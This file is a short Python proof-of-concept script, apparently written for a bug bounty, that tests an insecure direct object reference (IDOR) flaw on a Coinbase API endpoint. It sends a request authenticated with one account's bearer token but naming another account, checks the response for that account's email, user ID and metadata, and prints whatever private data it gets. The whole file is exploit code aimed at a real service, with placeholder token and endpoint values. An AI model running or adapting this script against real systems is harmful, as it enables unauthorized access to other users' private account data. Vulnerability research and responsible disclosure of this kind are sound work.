import sys
import json
import requests

# -------------------------------------------------------------
# CONFIGURATION
# -------------------------------------------------------------
# 攻撃側アカウント (poctest.base.eth) の Bearer トークンをセット
ATTACKER_TOKEN = "Bearer <INSERT_POCTEST_BASE_ETH_TOKEN_HERE>"
TARGET_ENDPOINT = "https://api.coinbase.com/v2/[BaseApp]"
VICTIM_TARGET_ID = "mylove-pet.base.eth"

def run_idor_poc():
    headers = {
        "Authorization": ATTACKER_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (BugBounty-PoC-Verification)"
    }

    payload = {
        "target_id": VICTIM_TARGET_ID
    }

    print(f"[*] Attacker Account : poctest.base.eth")
    print(f"[*] Target Account   : {VICTIM_TARGET_ID}")
    print(f"[*] Target Endpoint  : {TARGET_ENDPOINT}")
    print("[*] Sending cross-account unauthorized access request...\n")

    try:
        response = requests.post(TARGET_ENDPOINT, json=payload, headers=headers, timeout=10)
        
        print(f"[+] HTTP Status Code: {response.status_code}")
        print("--- [ RAW RESPONSE BODY ] ---")
        print(response.text)
        print("-----------------------------\n")

        if response.status_code == 200:
            res_json = response.json()
            data = res_json.get("data", {})
            
            # 被害者アカウントの非公開データの判定
            if "email" in data or "account_metadata" in data or "user_id" in data:
                print("==================================================")
                print("[🔥 VULNERABILITY CONFIRMED: IDOR DATA LEAKAGE]")
                print("==================================================")
                print(f"[+] Successfully extracted private data of {VICTIM_TARGET_ID} using Attacker's token!")
                print(json.dumps(data, indent=2, ensure_ascii=False))
                sys.exit(0)
            else:
                print("[-] 200 OK returned, but no secret fields found in payload.")
                sys.exit(1)
        else:
            print(f"[-] Access Denied or Endpoint Error (HTTP {response.status_code}).")
            sys.exit(1)

    except Exception as e:
        print(f"[-] Execution Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    run_idor_poc()
